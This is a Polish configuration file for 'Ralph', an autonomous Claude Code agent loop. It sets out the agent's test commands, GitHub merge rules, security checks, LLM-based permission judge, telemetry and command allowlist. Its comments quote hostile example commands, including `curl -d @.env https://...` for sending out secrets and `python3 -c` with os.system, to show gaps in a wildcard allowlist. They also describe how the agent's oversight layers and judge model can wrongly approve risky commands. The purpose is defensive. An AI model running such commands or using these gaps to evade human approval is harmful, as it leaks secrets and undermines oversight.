# ralph/config.md - Konfiguracja projektu

## Projekt

- **Doprecyzowany**: tak
  <!-- "nie" = wymaga fazy doprecyzowania (Ralph przeczyta spec/, wygeneruje pytania, potem ralph/PLAN.md) -->
  <!-- "tak" = projekt gotowy do implementacji (ralph/PLAN.md jest kompletny) -->

## Testy

- **Komenda testów**: cargo test --workspace
- **Komenda pełnego suite**: cargo test --workspace -- --include-ignored && cargo clippy --workspace --all-targets -- -D warnings && cargo fmt --all --check
- **Smoke suite**: cargo test --workspace
  <!-- Szybki podzbiór testów uruchamiany po KAŻDYM zadaniu (regresja wykrywana od razu,     -->
  <!-- nie po całej fazie). Np. testy ukończonych modułów. Małe projekty: pełny suite.       -->
  <!-- "brak" = pomiń (tylko testy zadania + pełny suite po fazie).                           -->
- **Pełny suite po**: każdej fazie
- **Linter/formatter**: `cargo clippy --workspace --all-targets -- -D warnings` · `cargo fmt --all --check`
- **Komenda typów**: cargo check --workspace --all-targets
  <!-- Typechecker, np. `mypy src`, `pyright`, `npx tsc --noEmit`. Kontrola lint-typy (## Kontrole)  -->
  <!-- uruchamia linter na zmienionych plikach przy commicie, a typechecker przy fazie.          -->
  <!-- "brak" = bez typecheckera.                                                               -->
- **Linter przed commit**: tak

## Git

- **Auto-commit**: tak
- **Auto-push**: tak
- **Strategia branchy**: brak (commit na bieżący branch)
- **Ignoruj przy commit**: `.env`, `.env.*`, `*.log`, `*.tmp`, `node_modules/`, `__pycache__/`, `.DS_Store`, `*.sqlite`, `artifacts/`, `ralph/PERMISSIONS.jsonl`, `ralph/KONTROLE.jsonl`
  <!-- Wzorce w backtickach CELOWO — lintery markdown zamieniają gołe *.log / __pycache__ -->
  <!-- na emfazę, cicho psując listę ignorowanych plików.                                  -->

## Integracje

<!-- Domyślnie Ralph nie ma ŻADNEJ integracji: commituje na bieżący branch, nie pushuje,   -->
<!-- nie zna trackera wymagań — dokładnie jak w projekcie bez tej sekcji. Każda integracja -->
<!-- dokłada własną sekcję instrukcji (templates/integrations/<typ>/<nazwa>/INSTRUKCJE.md) -->
<!-- i zmienia definicję "zadanie zrobione". Kreator: ./ralph-start.sh --integracje <proj> -->
<!-- (uruchamia się też sam przy pierwszym utworzeniu config.md).                          -->

- **Repozytorium**: github
  <!-- brak | github. Integracja z repozytorium = gałąź per zadanie + PR + merge;          -->
  <!-- zadanie jest zamknięte po MERGE, nie po otwarciu PR. Wymaga: gh (GitHub CLI)        -->
  <!-- zalogowanego, `Auto-push: tak` w ## Git. Ralph nigdy nie pushuje na main.           -->
- **Repo**: mario12358/voice-assistant
  <!-- owner/nazwa na GitHubie — kreator wykrywa z `git remote get-url origin` -->
- **Merge**: agent
  <!-- auto   = GitHub auto-merge (`gh pr merge --auto --squash`); wymaga repo publicznego  -->
  <!--          albo planu Pro/Team (branch protection z wymaganymi checkami).             -->
  <!-- agent  = Ralph czeka na checki i sam merguje po zielonych (`gh pr merge --squash`); -->
  <!--          działa na Free w repo prywatnym. GitHub niczego nie wymusza — reguły       -->
  <!--          "merge tylko przy zielonych wymaganych checkach" pilnuje sędzia uprawnień  -->
  <!--          (własne `gh pr checks` przed każdym merge), nie instrukcja.                -->
  <!-- ręczny = PR czeka na człowieka; liczy się do limitu otwartych PR.                   -->
- **Wymagane checki**: Specky contract check, test, Ralph: kontrole (lokalnie)
  <!-- Nazwy checków po przecinku, np. "Specky contract check, test". W trybie agent       -->
  <!-- lista NIE może być pusta — agent bez listy nie ma na co czekać.                     -->
- **Limit otwartych PR**: 3
  <!-- Osiągnięty limit (żaden PR czerwony) = RALPH WAITING, koniec sesji. Nic nie jest    -->
  <!-- zepsute — uruchom ponownie po merge.                                                -->
- **Czekaj na merge**: 10 min
  <!-- Ile Ralph czeka na checki/merge po otwarciu PR zanim weźmie kolejne zadanie.        -->
  <!-- Krótko = więcej łańcuchów gałęzi; długo = wolniejsza sesja, prostsza historia.      -->
- **Max poprawek na PR**: 3
  <!-- Czerwony check → poprawka na TEJ SAMEJ gałęzi (nigdy nowy PR). Po tylu poprawkach  -->
  <!-- RALPH BLOCKED z linkiem do PR. Osobny licznik od "Max prób na zadanie".             -->
- **Prefiks gałęzi**: zadanie-
  <!-- Gałąź zadania: <prefiks><id>-<slug>. Sędzia zdejmuje pytanie o push TYLKO na       -->
  <!-- gałęzie z tym prefiksem.                                                            -->
- **Tracker**: specky
  <!-- brak | specky. Tracker wymagań przez MCP: kotwice wymagań na zadaniach, trailer     -->
  <!-- `Specky-Req: <id>@<hash7>` w commitach, `specky: crit <id>` nad testami kryteriów,  -->
  <!-- synchronizacja (`what_changed`, `get_work_queue`) → pliki w changes/.               -->
- **Tracker projekt**: 01M4EJNFTHDZ3ECMHT7425APR0
  <!-- project_id projektu w trackerze (Specky: ULID z adresu projektu) -->
- **Tracker MCP**: https://app.specky.app/mcp
  <!-- Adres serwera MCP trackera — dla dokumentacji i kreatora; narzędzia MCP konfiguruje -->
  <!-- Claude Code (konektor claude.ai albo `claude mcp add`).                             -->

## Kontrole

<!-- Kontrole jakości: sprawdzenia, które odpalają się SAME przy operacjach gita —        -->
<!-- Ralph nie musi pamiętać, żeby je uruchomić. Punkty: commit (przed git commit),        -->
<!-- faza (przed tagiem ralph/faza-*), wydanie (przed tagiem vX.Y.Z), ci (w pipeline:     -->
<!-- python3 ralph-kontrole/ralph-kontrole.py --punkt ci --od origin/main).               -->
<!-- Znalezisko "blokuje" zatrzymuje operację, "ostrzega" trafia do Claude'a i do         -->
<!-- ralph/KONTROLE.jsonl. Moduły: ralph-kontrole/<nazwa>/ (opis w KONTROLA.md).           -->
<!-- Fałszywy alarm → wyjątek po odcisku w ralph/KONTROLE_WYJATKI.md — wpisuje człowiek;  -->
<!-- zapis do tego pliku, do modułów i do tej sekcji zawsze pyta człowieka.               -->

- **Włączone**: tak
  <!-- tak = hook PreToolUse + moduły kopiowane do ralph-kontrole/ przy starcie -->
- **Status na PR**: tak
  <!-- Przy integracji z repozytorium (sekcja Integracje → Repozytorium: github): po każdym pushu -->
  <!-- na gałąź zadania hook wystawia status commita "Ralph: kontrole (lokalnie)" — które       -->
  <!-- kontrole przeszły przy commitach tej gałęzi, kiedy, z jakim wynikiem, data ostatniego    -->
  <!-- audytu zależności. Commit bez lokalnego dowodu (zrobiony poza hookiem) = status czerwony. -->
  <!-- To oświadczenie z tej maszyny, nie weryfikacja: stąd "lokalnie" w nazwie. Kreator       -->
  <!-- dopisuje tę nazwę do "Wymagane checki", więc sędzia nie zmerguje PR-a bez dowodu.         -->
  <!-- nie = nic nie jest wysyłane.                                                             -->

### sekrety

- **Kiedy**: commit, faza, wydanie, ci
- **Zakres**: zmienione
- **Przy błędzie**: blokuje
  <!-- klucze w znanych formatach, pliki .env/*.pem; gitleaks, gdy jest w PATH -->

### oslabienia

- **Kiedy**: commit, faza, wydanie, ci
- **Zakres**: zmienione
- **Przy błędzie**: blokuje
  <!-- znacznik "ralph: osłabienie <id> — <powód>"; otwarte osłabienie blokuje wydanie;  -->
  <!-- MUTANT w kodzie blokuje zawsze; TLS off / debug / csrf_exempt bez znacznika ostrzega -->

### zaleznosci

- **Kiedy**: commit, faza, wydanie, ci
- **Zakres**: zmienione
- **Przy błędzie**: blokuje
  <!-- nowy pakiet w package.json / requirements / pyproject / deno.json vs rejestr:      -->
  <!-- nie istnieje (nazwa wymyślona przez model), ma < 7 dni, literówka popularnego → blokuje -->

### audyt-zaleznosci

- **Kiedy**: commit, faza, wydanie, ci
- **Zakres**: całość
- **Przy błędzie**: blokuje
  <!-- podatności z bazy OSV dla wersji z lockfile'i; blokuje krytyczne/wysokie z poprawką  -->
  <!-- w zależnościach produkcyjnych — reszta ostrzega                                     -->

### testy

- **Kiedy**: commit, faza, wydanie, ci
- **Zakres**: zmienione
- **Przy błędzie**: blokuje
  <!-- .only / fit / skip bez powodu / usunięty plik testu blokują; kod bez testu w commicie,  -->
  <!-- test zmieniony razem z kodem, który sprawdza, test bez asercji — ostrzegają           -->

### higiena

- **Kiedy**: commit, faza, wydanie, ci
- **Zakres**: zmienione
- **Przy błędzie**: blokuje
  <!-- katalogi budowania (dist/, node_modules/, __pycache__/…), plik > 5 MB, manifest        -->
  <!-- zmieniony bez lockfile'a → blokują; wersje pływające, binaria w kodzie, pliki IDE → ostrzegają -->

### martwe-wejscie

- **Kiedy**: commit, faza, wydanie, ci
- **Zakres**: całość
- **Przy błędzie**: blokuje
  <!-- symbol (funkcja / klasa / trasa / komponent) dodany od ostatniego tagu fazy, do którego   -->
  <!-- poza własnym testem nic się nie odwołuje — mechaniczny strażnik reguły "AC: wejście".    -->
  <!-- Narzędzia: vulture / knip / ts-prune, gdy są; bez nich grep po definicjach. Tylko ostrzega. -->

### sast

- **Kiedy**: commit, faza, wydanie, ci
- **Zakres**: zmienione
- **Przy błędzie**: blokuje
  <!-- semgrep (p/owasp-top-ten, p/security-audit) na zmienionych plikach; bez semgrepa wzorce  -->
  <!-- wbudowane. Wstrzyknięcia (SQL, komenda, kod), deserializacja, path traversal blokują;    -->
  <!-- reszta ostrzega. Pliki testów pomijane.                                                   -->

### lint-typy

- **Kiedy**: commit, faza, wydanie, ci
- **Zakres**: zmienione
- **Przy błędzie**: blokuje
  <!-- Linter z pola "Linter/formatter" i typechecker z "Komenda typów" (## Testy) na            -->
  <!-- zmienionych plikach; błędy blokują, ostrzeżenia ostrzegają. Pełny przebieg (tsc, mypy)    -->
  <!-- przy fazie. Dodatkowo cudzysłów typograficzny jako ogranicznik stringu — zawsze.          -->

### intencja

- **Kiedy**: commit, faza, wydanie, ci
- **Zakres**: zmienione
- **Przy błędzie**: blokuje
  <!-- Kod vs mapa powierzchni ataku ralph/BEZPIECZENSTWO.md (szkielet zakłada ralph-start.sh): -->
  <!-- nowa trasa bez wiersza w mapie i trasa bez strażnika swojej roli blokują; nowa trasa     -->
  <!-- publiczna, nowy host wychodzący, sekret ze środowiska, GRANT / SECURITY DEFINER, długi   -->
  <!-- blob base64 — ostrzegają. Projekt bez tras HTTP: cisza.                                  -->

### red-team

- **Kiedy**: commit, faza, wydanie, ci
- **Zakres**: zmienione
- **Przy błędzie**: blokuje
  <!-- Chroniona trasa zmieniona w fazie musi mieć test ze znacznikiem                          -->
  <!-- "ralph: red-team <METODA> <ścieżka> — bez-sesji, obca-rola, obcy-wlasciciel, csrf"       -->
  <!-- (przypadki wynikają z mapy). Brak blokuje tag fazy; pierwsza faza z mapą tylko ostrzega. -->

<!-- Pola kontroli: Kiedy (commit, faza, wydanie, ci), Zakres (zmienione | całość),       -->
<!-- Przy błędzie (blokuje | ostrzega — config może złagodzić moduł, nie zaostrzyć),      -->
<!-- Limit czasu (np. 30 s, 5 min). Kontrola bez wpisu tutaj nie działa i nic nie kosztuje. -->

## Artefakty wizualne

<!-- Opt-in: screeny per ekran z spec/ux_ui/ + nagrania per Krok z spec/APP_FLOW.md.        -->
<!-- Pełna procedura: sekcja 0.5 instrukcji (templates/instructions/CORE.md).               -->
<!-- Brak APP_FLOW.md mimo nagrania:tak → info w REPORT.md (nie blokada).                   -->

- **Screeny**: nie
  <!-- tak = po implementacji zadania z tagiem (screen: <id>) Ralph robi screenshot     -->
  <!--       i zapisuje do artifacts/screens/<id>.png (Playwright/Detox)                 -->
  <!-- nie = pomijaj — screenshoty tylko gdy Playwright robi je natywnie (on-failure)   -->

- **Nagrania**: nie
  <!-- tak = przy zadaniach e2e końca fazy z tagiem (flow: APP_FLOW.md#krok-N) Ralph    -->
  <!--       generuje wideo do artifacts/flows/krok-N-<slug>.webm (Playwright) lub .mp4 -->
  <!--       (Detox). Brak flow_files lub brak APP_FLOW.md → info w REPORT.md           -->
  <!-- nie = pomijaj — bez nagrań niezależnie od tagów                                  -->

- **Flow files**: spec/APP_FLOW.md
  <!-- Lista plików z procesami user→system (jeden lub wiele, oddzielone przecinkami).   -->
  <!-- Każdy plik ma sekcje "## Krok N — Tytuł" które są mapowane na osobne nagrania.    -->
  <!-- Pliki są częścią spec/ — zamrożone po klaryfikacji, zmiany przez changes/.        -->

- **Artifacts dir**: artifacts/
  <!-- Katalog na zapisywane screeny i wideo. Struktura: artifacts/screens/ + flows/.    -->
  <!-- Tworzony przy pierwszym artefakcie. Domyślnie w .gitignore.                       -->

- **Commit artefakty**: nie
  <!-- tak = artifacts/ trafia do gita (uwaga: wideo mogą być duże, rozważ Git LFS)      -->
  <!-- nie = artifacts/ w .gitignore; REPORT.md trzyma listę nazw plików dla audytu      -->

## Pętla Ralph

- **Max prób na zadanie**: 3
  <!-- Kompresja kontekstu (auto-compact) następuje automatycznie po zapełnieniu okna —      -->
  <!-- Claude nie może wywołać /compact sam. Ochroną są pliki stanu aktualizowane po każdym  -->
  <!-- zadaniu (sekcja 6 instrukcji).                                                        -->
- **Raportuj postęp**: tak
- **Rotacja plików stanu**: tak
  <!-- REPORT.md, PROJECT_CONTEXT.md i PLAN.md trafiają W CAŁOŚCI do promptu startowego     -->
  <!-- i rosną liniowo z projektem. Rotacja przenosi starsze wpisy do ralph/*_ARCHIVE.md    -->
  <!-- (write-only, nieładowane do żadnego promptu) przy każdym starcie: deterministycznie, -->
  <!-- zero tokenów. Zostaje 10 wpisów Historii realizacji, 10 wpisów logu, 10 wpisów      -->
  <!-- Historii zmian, 3 ostatnie przebiegi w Stanie testów, 3 datowane bullety            -->
  <!-- Podsumowania, 3 sekcje "## " spoza szablonu, 40 wierszy Kluczowych decyzji          -->
  <!-- i 30 wierszy Znanych problemów.                                                      -->
  <!-- Wpisem jest CAŁY blok (wielolinijkowy opis, podsekcja "### Faza …" wraz z prozą),    -->
  <!-- nie pojedyncza linia — rotacja nigdy nie rozcina wpisu na pół.                       -->
  <!-- Decyzja lub pułapka wciąż obowiązująca: oznacz wiersz znakiem 📌 — nie rotuje.       -->
  <!-- W PLAN.md rotują się dodatkowo WSTĘPY sekcji "## " spoza kanonu (opisy zgłoszeń);   -->
  <!-- fazy pod nimi zostają, a sekcja z choćby jednym zadaniem `- [ ]` nie jest ruszana.   -->
  <!-- "nie" wyłącza całość (także archiwizację faz poniżej).                               -->
- **Fazy planu w pliku**: 5
  <!-- Ile ostatnich faz ukończonych w 100% zostaje w ralph/PLAN.md w pełnej treści.        -->
  <!-- Starsze idą do ralph/PLAN_ARCHIVE.md, a w planie zostaje jednolinijkowy ślad z listą -->
  <!-- identyfikatorów — (wymaga: X.Y) do zadania z archiwum nadal się rozwiązuje.          -->
  <!-- Działa dopiero powyżej 100 KB planu (mały projekt = zero churnu w gicie).            -->
  <!-- "brak" = nie ruszaj PLAN.md; 0 = archiwizuj wszystkie ukończone fazy.                -->
- **Realizowane fazy**: wszystkie
  <!-- "wszystkie" = realizuj cały ralph/PLAN.md -->
  <!-- Lista identyfikatorów faz, np. "1, 2, 3" lub "1M, 2M, 3M" -->
  <!-- Multi-client (BFF): branch web → "1, 2, 3", branch mobile → "1M, 2M, 3M" -->
  <!-- Identyfikator = cyfra lub cyfra+litera (case-sensitive, match z nagłówkiem PLAN.md) -->
  <!-- Ralph pominie zadania z faz niewymienionych na liście -->

## Katalogi robocze

<!-- Katalogi POZA repozytorium, do których Claude ma dostęp bez pytania.               -->
<!-- Ralph synchronizuje tę listę z permissions.additionalDirectories w                 -->
<!-- .claude/settings.local.json (dostęp do plików — bez ładowania CLAUDE.md, hooków    -->
<!-- ani skilli z tych katalogów, w odróżnieniu od flagi --add-dir).                    -->
<!-- Ta sama lista trafia do sędziego uprawnień: operacje na plikach w tych katalogach  -->
<!-- przestają być traktowane jak "poza projektem".                                     -->
<!-- NIE TRZEBA tu wpisywać: katalogu projektu ani scratchpada sesji Claude Code        -->
<!-- (/private/tmp/claude-<uid>) — sędzia ufa im domyślnie. Scratchpad to workspace     -->
<!-- agenta, nie pliki użytkownika; wzorzec kopia → mutacja → przywrócenie działa       -->
<!-- bez żadnego wpisu. Wpisz go tutaj tylko, jeśli chcesz, żeby Claude Code czytał     -->
<!-- stamtąd pliki także bez pytania.                                                   -->

- **Dodatkowe katalogi**:
  <!-- Ścieżki bezwzględne, `~` i `$ZMIENNE` są rozwijane; względne liczone od projektu. -->
  <!-- Korzenie w rodzaju `/`, `~`, `/Users`, `/Volumes` są odrzucane — to nie jest      -->
  <!-- konfiguracja, tylko wyłączenie ochrony.                                           -->
  <!-- Przykłady:                                                                        -->
  <!--   - /private/tmp/claude-501     scratchpad sesji Claude Code (ścieżka per sesja   -->
  <!--                                 zawiera UUID — wpisuje się KORZEŃ, nie instancję) -->
  <!--   - ~/.cache/moj-projekt        cache builda trzymany poza repo                   -->

- **Auto-sync katalogów**: tak
  <!-- tak = katalogi dopisane w .claude/settings.local.json wracają przy starcie tutaj -->
  <!-- nie = ten plik jest jedynym źródłem prawdy                                       -->

## Automatyczna akceptacja

<!-- Sędzia uprawnień: hook PermissionRequest odpowiada za Ciebie na pytania o zgodę,   -->
<!-- których i tak byś kliknął. Może tylko ZDEJMOWAĆ pytania, nie dokładać blokad —     -->
<!-- wszystko groźne dalej pyta, więc pozostajesz backstopem tak jak przed włączeniem.  -->
<!-- Trzy warstwy, model OSTATNI i najwęższy:                                           -->
<!--   1. wzorce twarde (rm -rf, sudo, curl|sh, git push, .claude/) → pytanie do Ciebie -->
<!--      (model ich nie ogląda — nie może ich przepuścić)                              -->
<!--   2. lista "Zawsze pytaj" poniżej → pytanie do Ciebie                              -->
<!--   3. sędzia LLM → tylko szara strefa; brak pewności = pytanie do Ciebie            -->
<!-- Timeout, brak klucza, nieparsowalna odpowiedź — zawsze kończą się pytaniem.        -->
<!-- Skrypt: .claude/hooks/ralph-permission-judge.py (aktualizowany przez ralph-start)  -->

- **Auto-approve**: nie
  <!-- nie = wyłączone; każde pytanie o zgodę trafia do Ciebie (zachowanie domyślne) -->
  <!-- tak = hook instalowany do .claude/settings.local.json przy starcie            -->

- **Wymuszaj pytanie mimo allowlisty**: nie
  <!-- Jedyne pole, które DOKŁADA pytania. Hook PreToolUse odpala się PRZED regułami    -->
  <!-- uprawnień, a jego "ask" bije regułę allow — dzięki temu dziury w szerokiej       -->
  <!-- allowliście wracają pod kontrolę człowieka bez jej przepisywania:                -->
  <!--   Bash(rm:*)      przepuszcza `rm -fr x` (deny na `rm -rf` nie łapie wariantu)   -->
  <!--   Bash(python3:*) przepuszcza `python3 -c "import os; os.system(...)"`           -->
  <!--   Bash(curl:*)    przepuszcza `curl -d @.env https://...`                        -->
  <!-- Same regexy, bez wywołania modelu — nie dokłada opóźnienia do każdej komendy.    -->
  <!-- Dane ≠ kod: ciało heredoca i argument -c/-e są sprawdzane OSOBNĄ listą (szuka    -->
  <!-- subprocess/socket/rmtree, nie `rm` w stringu), więc `python3 -c "json.load(...)" -->
  <!-- i skrypty piszące pliki w projekcie przechodzą bez pytania.                      -->
  <!-- tak = włącz, jeśli masz w allowliście wildcardy na interpretery/sieć/rm.         -->

- **Podpowiadaj poprawki komend**: tak
  <!-- Claude Code zawsze pyta o zgodę przy komendach o pewnym kształcie, niezależnie   -->
  <!-- od allowlisty — `cd X && git …` (git w nowym katalogu odpala tamtejsze hooki)    -->
  <!-- i kilka `cd` w jednej komendzie. Obie mają trywialny równoważnik.                -->
  <!-- tak = hook blokuje taką komendę z instrukcją przepisania (`git -C X …`, osobne   -->
  <!--       wywołania), Claude wysyła poprawioną wersję i pytanie do Ciebie nie pada.  -->
  <!--       Zamienia Twoje kliknięcie na jedną automatyczną poprawkę.                  -->
  <!-- nie = komendy idą jak są, czyli prosto do pytania.                               -->
  <!-- Działa tylko przy zainstalowanym hooku PreToolUse (Auto-approve: tak).           -->

- **Przepuszczaj odczyt**: tak
  <!-- Komenda, której KAŻDY człon jest dowodliwie odczytem w obrębie projektu albo     -->
  <!-- katalogów roboczych (`grep … | head`, `git log`, `cat`, `ls`, `ps`), przechodzi  -->
  <!-- bez modelu. W logu projektu referencyjnego to 26% pytań szarej strefy.           -->
  <!-- Dowód, nie domysł: rozwinięcie zmiennej, podpowłoka, praca w tle, nieznana       -->
  <!-- opcja, plik z sekretami (.env, *.pem), ścieżka poza projekt (także przez         -->
  <!-- dowiązanie) — warstwa się wycofuje i komenda idzie dalej zwykłą drogą.           -->
  <!-- Wzorce twarde i lista "Zawsze pytaj" mają przed nią pierwszeństwo.               -->
  <!-- Działa przy `Sędzia: command` i `reguly`, także gdy model jest niedostępny.      -->

- **Sędzia**: command
  <!-- command = własny skrypt + model przez API zgodne z OpenAI (Qwen, Ollama, vLLM). -->
  <!-- reguly  = ten sam skrypt BEZ modelu: wzorce twarde, "Zawsze pytaj" i warstwa    -->
  <!--           odczytu. Odczyt nie pyta, cała reszta pyta Ciebie. Wariant na czas,   -->
  <!--           gdy żadnego modelu nie ma pod ręką.                                   -->
  <!-- brak    = bez sędziego LLM; zostaje sam PreToolUse (pole wyżej)                 -->
  <!--           Jedyny wariant z pełną warstwą deterministyczną PRZED modelem:        -->
  <!--           trafienie w "Zawsze pytaj" = pytanie do Ciebie, nie odmowa.           -->
  <!-- prompt  = wbudowany sędzia Claude Code (pole Model (prompt/agent)). Zero        -->
  <!--           konfiguracji, ale warstwa 2 może wtedy tylko blokować, nie pytać.     -->
  <!-- agent   = jak prompt, ale sędzia ma Read/Grep i może sprawdzić stan repo.       -->
  <!--           Wolniejszy i droższy; w Claude Code oznaczony jako eksperymentalny.   -->

- **Poziom ryzyka**: konserwatywny
  <!-- konserwatywny = ALLOW tylko dla operacji odwracalnych, zamkniętych w projekcie: -->
  <!--                 testy, lintery, build, odczyt, git add/commit/diff/log.         -->
  <!--                 Podstawienia komend $( ) i backticki → pytanie do Ciebie.       -->
  <!-- zbalansowany  = dodatkowo zapis plików w projekcie, instalacja zależności       -->
  <!--                 z oficjalnych rejestrów, docker compose na localhost, migracje. -->
  <!-- Zapis udający odczyt (`echo x > plik`, `sed -i`, `sort -o`, `find -delete`, rm  -->
  <!-- i mv w projekcie) przy konserwatywnym PYTA z reguł, zanim komenda dotrze do    -->
  <!-- modelu — model przepuszczał 19 takich na 26 błędów w zbiorze oceny. Przy obu  -->
  <!-- poziomach pytają z reguł: git porzucający pracę (checkout --, restore, stash,  -->
  <!-- commit --amend, rebase, tag), pliki z sekretami, dowiązanie poza projekt,     -->
  <!-- program spod ścieżki projektu udający komendę systemową, PATH= przed komendą. -->

- **Bramkowane narzędzia**: Bash
  <!-- Wzorzec nazw narzędzi (regex/pipe), np. "Bash" albo "Bash|Edit|Write".          -->
  <!-- Przy Tryb: acceptEdits Edit/Write i tak nie pytają — sam Bash zwykle wystarcza. -->

- **Model (command)**: Qwen3.5-122B-A10B-FP8
- **Endpoint (command)**: https://przyklad.serwer/v1/chat/completions
- **Klucz API (command)**: env:RALPH_JUDGE_API_KEY
  <!-- Ten plik idzie do gita, więc NIE wklejaj tu klucza. Cztery formy zapisu:        -->
  <!--   env:NAZWA        zmienna środowiskowa; wymaga `export NAZWA=sk-...`           -->
  <!--   plik:~/.config/ralph/judge.key    pierwsza linia pliku spoza repo — bez       -->
  <!--                    exportu, działa też gdy odpalasz `claude` bez ralph-start.sh -->
  <!--   cmd:security find-generic-password -s ralph-judge -w    stdout komendy;       -->
  <!--                    macOS Keychain / pass / vault — klucz nigdzie nie leży jawnie -->
  <!--   sk-...           wprost; skrypt ostrzega przy każdym starcie, użyj tylko gdy  -->
  <!--                    config.md NIE jest wersjonowany                              -->
  <!--   brak             bez nagłówka Authorization — dla serwera lokalnego            -->
  <!-- Cokolwiek nie da się rozwiązać = sędzia milczy, pytanie trafia do Ciebie.       -->

- **Endpoint zapasowy (command)**: brak
- **Model zapasowy (command)**:
- **Klucz API zapasowy (command)**: brak
- **Tryb zapasowego**: cień
  <!-- Drugi model, pytany gdy główny NIE ODPOWIADA (sieć, timeout, 401, 5xx). Typowo   -->
  <!-- lokalny: Ollama `http://localhost:11434/v1/chat/completions`, LM Studio          -->
  <!-- `http://localhost:1234/v1/chat/completions` — oba mówią API zgodnym z OpenAI.    -->
  <!-- cień  = zapasowy o niczym nie decyduje. Jego werdykt trafia do logu (w tle, bez  -->
  <!--         opóźnienia), także wtedy, gdy główny działa — po to, żeby dało się       -->
  <!--         porównać oba modele na Twoich własnych komendach, zanim dasz mu prawo    -->
  <!--         zgody. Wynik: `python3 tools/ralph-judge-eval.py --etykiety <projekt>`   -->
  <!-- zgoda = gdy główny nie odpowiada, ALLOW zapasowego zdejmuje pytanie.             -->
  <!-- ZANIM ustawisz `zgoda`, przepuść model przez zbiór oceny — mały model łatwiej    -->
  <!-- przepuszcza to, co groźne, a ALLOW jest jedyną decyzją sędziego ze skutkiem:     -->
  <!--   python3 <ralph>/tools/ralph-judge-eval.py --endpoint … --model …               -->
  <!-- Wymagany wynik: FAŁSZYWE ZGODY: 0.                                               -->
  <!-- Po awarii głównego hook przez 2 minuty nie próbuje go ponownie, więc martwy      -->
  <!-- serwer nie dokłada timeoutu do każdej komendy.                                   -->

- **Model (prompt/agent)**: claude-haiku-4-5-20251001

- **Log decyzji**: tak
  <!-- tak = każda decyzja (warstwa, powód, komenda) → ralph/PERMISSIONS.jsonl.        -->
  <!-- Jedyny sposób, żeby sprawdzić, czy sędzia nie przepuszcza za dużo. Zostaw "tak" -->
  <!-- przynajmniej przez pierwszych kilka sesji.                                      -->
  <!-- Log zawiera PEŁNE komendy i zostaje na tej maszynie — telemetria wysyła z niego -->
  <!-- same liczniki. Nowe projekty mają go w "Ignoruj przy commit" (sekcja Git);      -->
  <!-- w projekcie założonym wcześniej dopisz tam `ralph/PERMISSIONS.jsonl` sam.       -->

- **Loguj decyzję człowieka**: tak
  <!-- Hook PostToolUse dopisuje do logu, że komenda, o którą padło pytanie, faktycznie -->
  <!-- się wykonała — czyli że się zgodziłeś. Niczego nie ocenia i na nic nie wpływa.   -->
  <!-- To jedyne etykiety, z których da się ocenić model na Twoich komendach albo       -->
  <!-- kiedyś dostroić własny. Wymaga `Log decyzji: tak`.                               -->

- **Zawsze pytaj**:
  <!-- Dodatkowe wzorce (regex, case-insensitive) sprawdzane PRZED modelem.            -->
  <!-- Model ich nie nadpisze. Przykłady: `docker\s+system\s+prune`, `alembic\s+downgrade` -->

## Telemetria

<!-- Zdarzenia o JAKOŚCI PRACY RALPHA idą na serwer zespołu (ralph-hub), żeby framework   -->
<!-- dało się poprawiać na podstawie tego, co faktycznie dzieje się w projektach: próby   -->
<!-- na zadanie, log problemów, bugfixy, blokady, pułapki, wyniki scenariuszy ręcznych.   -->
<!-- Wysyłka leci w tle przy starcie, zero tokenów, nigdy nie blokuje pracy; nieudana     -->
<!-- ponawia się sama przy następnym starcie.                                             -->
<!-- NIE wychodzi: spec/, kod, changes/ ani komendy z PERMISSIONS.jsonl (same liczniki).  -->
<!-- Podgląd tego, co by poszło: python3 <ralph>/tools/ralph-retro.py <projekt> --json    -->

- **Wysyłaj**: tak
  <!-- nie = nic nie opuszcza tej maszyny -->

- **Endpoint**: https://ralph-hub.specky.app:8443
  <!-- Adres serwera ralph-hub. Serwer niedostępny = nic się nie dzieje: wysyłka idzie w   -->
  <!-- tle, start na nią nie czeka, a zaległe zdarzenia dojdą przy którymś następnym.      -->
  <!-- "brak" = wysyłka milczy                                                             -->

- **Klucz API**: wbudowany
  <!-- wbudowany = wspólny token zespołu (tylko zapis) dostarczany z Ralphem — nic nie     -->
  <!-- trzeba ustawiać. Własny token podajesz w tych samych formach co u sędziego:         -->
  <!-- env:NAZWA · plik:<ścieżka poza repo> · cmd:<komenda> — nigdy wprost, plik idzie do gita -->

- **Etykieta projektu**:
  <!-- Czytelna nazwa projektu na serwerze; puste = nazwa katalogu projektu -->

## Uprawnienia

<!-- Ralph synchronizuje tę sekcję z .claude/settings.local.json przy każdym starcie:    -->
<!-- 1. Przy starcie: ralph/config.md ∪ settings.local.json → zapis do obu plików        -->
<!-- 2. Podczas sesji: Claude CLI sam dopisuje "allow always" do settings.local.json      -->
<!-- 3. Przy kolejnym starcie: nowe wpisy sa merge-owane z powrotem tutaj                 -->

- **Tryb**: acceptEdits
  <!-- default            = pyta o każde narzędzie                       -->
  <!-- acceptEdits        = auto-akceptuje Edit/Write, pyta o Bash       -->
  <!-- bypassPermissions  = zero pytań (ryzykowne, np. rm -rf)           -->
  <!-- plan               = tryb planowania bez modyfikacji plików       -->

- **Auto-sync nowych uprawnień**: tak
  <!-- tak = uprawnienia przyznane w sesji ("allow always") są przy kolejnym starcie -->
  <!-- dopisywane do tej listy, żeby nie pytać ponownie                               -->
  <!-- nie = tylko ten plik jest źródłem prawdy, nowe wpisy z sesji są ignorowane     -->

- **Generalizuj uprawnienia**: tak
  <!-- tak = dokładne komendy zaakceptowane w sesji awansują do wzorców Bash(rodzina:*) -->
  <!-- dla kurowanej listy bezpiecznych rodzin (testy, lintery, git add/commit, docker  -->
  <!-- compose, ...). Destrukcyjne/sieciowe (rm, sudo, curl, git push) nigdy.           -->
  <!-- nie = wpisy zostają dokładnie takie, jak zatwierdzono                             -->

- **Dozwolone komendy**:
  - mcp__plugin_specky_specky
  - mcp__claude_ai_Specky
  - Bash(gh pr status:*)
  - Bash(gh pr diff:*)
  - Bash(gh pr checks:*)
  - Bash(gh pr view:*)
  - Bash(gh pr list:*)
  - Bash(gh pr create:*)
  - Bash(gh repo view:*)
  - Bash(gh auth status)
  - Bash(git branch -d:*)
  - Bash(git branch --list:*)
  - Bash(git branch --show-current)
  - Bash(git rev-parse:*)
  - Bash(git merge-base:*)
  - Bash(git rebase:*)
  - Bash(git switch:*)
  - Bash(git checkout main)
  - Bash(git checkout -b:*)
  - Bash(git pull:*)
  - Bash(git fetch:*)
  - Bash(git push --force-with-lease origin zadanie-:*)
  - Bash(git push origin zadanie-:*)
  - Bash(git push -u origin zadanie-:*)
  - Bash(git add:*)
  - Bash(git commit:*)
  - Bash(git describe:*)
